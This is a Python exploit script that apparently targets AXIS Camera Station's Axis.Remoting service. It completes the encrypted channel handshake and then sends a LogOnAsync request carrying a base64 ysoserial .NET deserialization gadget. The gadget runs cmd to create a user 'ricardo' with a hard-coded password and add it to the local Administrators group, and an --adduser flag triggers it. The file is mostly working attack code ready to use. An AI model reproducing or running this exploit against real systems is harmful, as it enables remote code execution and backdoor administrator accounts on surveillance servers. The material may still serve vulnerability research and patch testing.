#!/usr/bin/env python3
import socket, struct, threading, sys, time, base64, argparse, datetime, os, json, secrets, string
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key, load_pem_private_key
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography import x509
from cryptography.x509.oid import NameOID


# Load the client's RSA private key from a PEM file.
def load_priv(path):
    return load_pem_private_key(open(path, "rb").read(), password=None)


# Build a self-signed client X.509 cert and return it base64-encoded (POST body).
def client_cert_b64(priv, cn="client"):
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    now = datetime.datetime.now(datetime.timezone.utc)
    der = (x509.CertificateBuilder()
           .subject_name(name).issuer_name(name)
           .public_key(priv.public_key())
           .serial_number(x509.random_serial_number())
           .not_valid_before(now)
           .not_valid_after(now + datetime.timedelta(days=3650))
           .sign(priv, hashes.SHA256())
           .public_bytes(serialization.Encoding.DER))
    return base64.b64encode(der)


# Generate a session AES key, wrap it with the server public key (PKCS#1 v1.5); return (key, iv, "wrapped:iv").
def wrap_aes_body(server_pub, aes_len=32):
    aes_key = os.urandom(aes_len)
    iv = os.urandom(16)
    wrapped = server_pub.encrypt(aes_key, padding.PKCS1v15())
    body = base64.b64encode(wrapped) + b":" + base64.b64encode(iv)
    return aes_key, iv, body


# Raw AES-CBC decrypt (no unpadding).
def aes_cbc_dec(key, iv, ct):
    d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    return d.update(ct) + d.finalize()


# Raw AES-CBC encrypt (no padding added).
def aes_cbc_enc(key, iv, pt):
    e = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return e.update(pt) + e.finalize()


# Strip PKCS#7 padding; return bytes unchanged if padding is invalid.
def pkcs7_unpad(b):
    if not b or len(b) % 16 != 0:
        return b
    n = b[-1]
    if 1 <= n <= 16 and b[-n:] == bytes([n]) * n:
        return b[:-n]
    return b


# Add PKCS#7 padding up to the block size.
def pkcs7_pad(b, block=16):
    n = block - (len(b) % block)
    return b + bytes([n]) * n


# Decrypt a server->client channel frame (AES-CBC + PKCS#7).
def channel_decrypt(key, iv, ct):
    return pkcs7_unpad(aes_cbc_dec(key, iv, ct))


# Encrypt a client->server message ready for the POST body (AES-CBC + PKCS#7).
def channel_encrypt(key, iv, plaintext):
    return aes_cbc_enc(key, iv, pkcs7_pad(plaintext))


# Read HTTP headers from a socket up to \r\n\r\n; return (headers, remainder).
def recv_headers(sock):
    buf = b""
    while b"\r\n\r\n" not in buf:
        ch = sock.recv(4096)
        if not ch:
            break
        buf += ch
    head, _, rest = buf.partition(b"\r\n\r\n")
    return head, rest


# Chunked HTTP body reader that keeps the connection alive and logs received bytes.
class ChunkedReader:
    def __init__(self, sock, initial=b""):
        self.sock, self.buf = sock, initial
        self.raw_log = bytearray()

    def _fill(self):
        d = self.sock.recv(4096)
        if not d:
            raise ConnectionError("closed")
        self.raw_log += d
        self.buf += d

    def read_body(self):
        while True:
            while b"\r\n" not in self.buf:
                self._fill()
            size, _, self.buf = self.buf.partition(b"\r\n")
            n = int(size.strip(), 16)
            if n == 0:
                return
            while len(self.buf) < n + 2:
                self._fill()
            yield self.buf[:n]
            self.buf = self.buf[n + 2:]


# Reassemble [uint32 LE][data] frames from a byte stream.
class FrameParser:
    def __init__(self):
        self.buf = b""

    def feed(self, data):
        self.buf += data
        while len(self.buf) >= 4:
            (n,) = struct.unpack_from("<I", self.buf, 0)
            if len(self.buf) < 4 + n:
                break
            fr = self.buf[4:4 + n]
            self.buf = self.buf[4 + n:]
            yield fr


rx_frames = []
channel_id = None
rx_ready = threading.Event()


# RX thread: open GET /_/, receive the channelID and the server frames (cert, AES, channel).
def rx_loop(host, port, timeout=40):
    global channel_id
    rx = socket.create_connection((host, port)); rx.settimeout(timeout)
    rx.sendall((f"GET /_/ HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"User-Agent: Axis.Remoting\r\nConnection: keep-alive\r\n\r\n").encode())
    _, rest = recv_headers(rx)
    reader, parser = ChunkedReader(rx, rest), FrameParser()
    try:
        for body in reader.read_body():
            for frame in parser.feed(body):
                rx_frames.append(frame)
                idx = len(rx_frames)
                if idx == 1:
                    channel_id = frame.decode(errors="replace")
                    print(f"[RX] channelID = {channel_id}")
                    rx_ready.set()
                elif frame[:4] in (b"MIIC", b"MIIB", b"MIID"):
                    print(f"[RX] frame#{idx}: server cert ({len(frame)}B)")
                else:
                    print(f"[RX] frame#{idx}: {len(frame)}B  {frame[:24].hex()}")
    except socket.timeout:
        print("[RX] Timeout (end of listening)")
    except ConnectionError as e:
        print(f"[RX] Closed: {e}")


# Send a POST /_/<chan> with the given body; return (status line, socket).
def post(host, port, chan, body, timeout=40):
    s = socket.create_connection((host, port)); s.settimeout(timeout)
    s.sendall((f"POST /_/{chan} HTTP/1.1\r\nHost: {host}:{port}\r\n"
               f"User-Agent: Axis.Remoting\r\nContent-Length: {len(body)}\r\n"
               f"Connection: keep-alive\r\n\r\n").encode() + body)
    head, rest = recv_headers(s)
    return head.split(b"\r\n", 1)[0].decode(errors="replace"), s


# Split a 'base64(wrapped):base64(iv)' frame into (wrapped_bytes, iv_bytes).
def parse_wrapped_iv(frame):
    txt = frame.decode(errors="replace")
    if ":" in txt:
        a, b = txt.split(":", 1)
        return base64.b64decode(a), base64.b64decode(b)
    return base64.b64decode(txt), None


# Generate a random 12-character request Id, matching the legitimate client style.
def rand_id(n=12):
    return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(n))


# Return the VersionFacade.get_ProductVersion test Request with a random Id.
def build_version_request():
    return {"Request": {"Id": rand_id(), "Service": "VersionFacade",
                        "Method": "get_ProductVersion", "Parameters": {}}}


# ysoserial.exe -g WindowsIdentity -f Json.Net -c "net user ricardo ThisIsIt123 && net localgroup administrators ricardo /add" -o raw
def build_adduser_request(host, port):
    return {"Request": {"Id": rand_id(), "Service": "SessionFacade", "Method": "LogOnAsync",
        "Parameters": {
            "uri": f"http://{host}:{port}/",
            "clientInformationDto": {
                "$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "System.Security.ClaimsIdentity.actor": "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAgQY8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIG5ldCB1c2VyIHJpY2FyZG8gVGhpc0lzSXQxMjMgJmFtcDsmYW1wOyBuZXQgbG9jYWxncm91cCBhZG1pbmlzdHJhdG9ycyByaWNhcmRvIC9hZGQiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw=="
            },
            "communicationType": 0, "ct": rand_id()}}
            }


# Run the RX thread and wait for the channelID; exit on timeout.
def open_rx_channel(host, port):
    threading.Thread(target=rx_loop, args=(host, port), daemon=True).start()
    if not rx_ready.wait(timeout=10):
        sys.exit("[!] ChannelID not received")
    time.sleep(1.2)


# Perform the handshake (POST client cert, POST wrapped AES:IV); return (my_key, my_iv).
def do_handshake(host, port, priv):
    server_cert = next((f for f in rx_frames if f[:4] in (b"MIIC", b"MIIB", b"MIID")), None)
    if not server_cert:
        sys.exit("[!] Server cert not received")
    spub = x509.load_der_x509_certificate(base64.b64decode(server_cert)).public_key()

    st, _ = post(host, port, channel_id, client_cert_b64(priv))
    print(f"[TX] POST cert -> {st}")

    my_key, my_iv, body = wrap_aes_body(spub)
    st2, _ = post(host, port, channel_id, body)
    print(f"[TX] POST AES:IV -> {st2}")
    print(f"[TX]   my AES = {my_key.hex()}")
    print(f"[TX]   my IV  = {my_iv.hex()}")
    if "200" not in st2:
        sys.exit(f"[!] Server rejected the AES: {st2}")
    return my_key, my_iv


# Unwrap the server AES key/IV (frame#3) and decrypt the initial channel frames.
def read_initial_channel(priv):
    server_key = server_iv = None
    if len(rx_frames) >= 3:
        wrapped, siv = parse_wrapped_iv(rx_frames[2])
        try:
            server_key = priv.decrypt(wrapped, padding.PKCS1v15())
            server_iv = siv
            print(f"\n[+] Server AES ({len(server_key)*8}bit): {server_key.hex()}")
            print(f"[+] Server IV: {server_iv.hex() if server_iv else 'None'}")
        except Exception as e:
            print(f"[!] Could not unwrap the server AES: {e}")

    cipher_frames = rx_frames[3:]
    print(f"[*] {len(cipher_frames)} channel frames: {[len(f) for f in cipher_frames]}")
    print("\n===== Decrypted channel (AES_server + IV_server, CBC, PKCS#7) =====")
    for i, ct in enumerate(cipher_frames, 4):
        if len(ct) % 16 != 0:
            print(f" frame#{i}: {len(ct)}B not a multiple of 16: {ct[:32].hex()}")
            continue
        pt = channel_decrypt(server_key, server_iv, ct)
        try:
            print(f" frame#{i} ({len(pt)}B): {pt.decode('utf-8')!r}")
        except UnicodeDecodeError:
            print(f" frame#{i} ({len(pt)}B): {pt.hex()}")
    return server_key, server_iv


# Pick the Request to send from --json (file) or the --version / --adduser shortcuts.
def select_request(args):
    if args.json:
        try:
            return json.loads(open(args.json, "r", encoding="utf-8").read())
        except OSError as e:
            sys.exit(f"[!] Could not read {args.json}: {e}")
        except json.JSONDecodeError as e:
            sys.exit(f"[!] {args.json} is not valid JSON: {e}")
    if args.version:
        return build_version_request()
    if args.adduser:
        return build_adduser_request(args.host, args.port)
    return None


# Send the app-level HELLO (ClientId) and the Request, then decrypt the response.
def send_request(host, port, my_key, my_iv, server_key, server_iv, req_obj, listen):
    n_before = len(rx_frames)
    hello = channel_encrypt(my_key, my_iv, channel_id.encode())
    st_h, _ = post(host, port, channel_id, hello)
    print(f"\n[TX] HELLO ClientId={channel_id} -> {st_h}")
    time.sleep(0.3)

    pt = json.dumps(req_obj, separators=(",", ":")).encode()
    print(f"[TX] Request: {pt.decode()}")
    st, _ = post(host, port, channel_id, channel_encrypt(my_key, my_iv, pt))
    print(f"[TX] Encrypted POST ({len(pt)}B) -> {st}")

    print(f"[*] Waiting for response up to {listen}s...")
    deadline = time.time() + listen
    while time.time() < deadline and len(rx_frames) <= n_before:
        time.sleep(0.3)
    for j, ct_r in enumerate(rx_frames[n_before:], 1):
        if len(ct_r) == 0 or len(ct_r) % 16:
            continue
        pt_r = channel_decrypt(server_key, server_iv, ct_r)
        try:
            print(f"\n[RESP#{j}] ({len(pt_r)}B):\n{pt_r.decode('utf-8')}")
        except UnicodeDecodeError:
            print(f"\n[RESP#{j}] ({len(pt_r)}B): {pt_r.hex()}")


# Parse arguments, run the handshake, and optionally send a Request.
def main():
    ap = argparse.ArgumentParser(description="AXIS Camera Station channel client (handshake + Axis.Remoting).")
    ap.add_argument("--host", "--ip", dest="host", required=True, help="Target IP/host")
    ap.add_argument("--port", dest="port", type=int, default=55752, help="Port (default 55752)")
    ap.add_argument("--key", required=True, help="client_priv.pem (RSA-2048)")
    ap.add_argument("--json", default="", help="Local JSON file with the Request to send")
    ap.add_argument("--version", action="store_true", help="VersionFacade.get_ProductVersion Request")
    ap.add_argument("--adduser", action="store_true", help="Create user ricardo with password ThisIsIt123 and add it to the Administrators group")
    ap.add_argument("--wait", type=float, default=5.0, help="Seconds listening to the channel")
    ap.add_argument("--listen", type=float, default=15.0, help="Seconds waiting for the response")
    args = ap.parse_args()

    priv = load_priv(args.key)
    print(f"[*] {args.host}:{args.port}")
    open_rx_channel(args.host, args.port)
    my_key, my_iv = do_handshake(args.host, args.port, priv)

    print(f"\n[*] Listening to the channel {args.wait}s...")
    time.sleep(args.wait)
    server_key, server_iv = read_initial_channel(priv)

    req_obj = select_request(args)
    if req_obj is not None:
        send_request(args.host, args.port, my_key, my_iv, server_key, server_iv, req_obj, args.listen)


if __name__ == "__main__":
    main()